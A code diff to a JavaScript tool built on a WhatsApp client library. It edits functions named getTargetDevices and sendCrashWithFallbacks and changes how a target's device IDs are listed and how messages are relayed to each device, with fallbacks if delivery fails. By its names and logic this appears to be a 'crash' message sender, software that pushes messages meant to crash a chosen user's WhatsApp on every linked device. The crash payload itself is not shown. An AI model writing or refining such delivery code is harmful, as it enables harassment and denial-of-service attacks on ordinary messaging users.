@@ -24,19 +24,14 @@ async function getTargetDevices(sock, target) {
             const res = await sock.getUSyncDevices([baseJid], false, false);
             if (Array.isArray(res)) {
                 for (const item of res) {
-                    const u = item.user || cleanUser;
-                    const d = item.device !== undefined ? item.device : 0;
-                    deviceSet.add(`${u}:${d}@s.whatsapp.net`);
+                    if (item.user && item.device !== undefined && item.device !== 0) {
+                        deviceSet.add(`${item.user}:${item.device}@s.whatsapp.net`);
+                    }
                 }
             }
         }
     } catch (e) {
-        // Fallback to base JID and common device indexes
-    }
-
-    if (deviceSet.size <= 1) {
-        deviceSet.add(`${cleanUser}:0@s.whatsapp.net`);
-        deviceSet.add(`${cleanUser}:1@s.whatsapp.net`);
+        // Fallback to primary base JID
     }
 
     return Array.from(deviceSet);
@@ -68,13 +63,12 @@ async function sendCrashWithFallbacks(sock, target, message, options = {}) {
             errors.push(`Group Relay [${target}]: ${e.message}`);
         }
     } else {
-        // Direct individual JID and device JID relays
+        // Primary user base JID and valid resolved devices
         const devices = await getTargetDevices(sock, target);
 
         for (const devJid of devices) {
             try {
                 const msgId = generateMsgId(sock);
-                // Do NOT supply participant attribute for individual user JIDs
                 const relayOpts = {
                     messageId: msgId,
                     ...options
@@ -89,7 +83,7 @@ async function sendCrashWithFallbacks(sock, target, message, options = {}) {
             }
         }
 
-        // Secondary direct fallback to baseJid via relayMessage if initial attempts yielded no success
+        // Secondary direct fallback if primary relays failed
         if (deliveredCount === 0) {
             const cleanUser = String(target || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
             const baseJid = `${cleanUser}@s.whatsapp.net`;
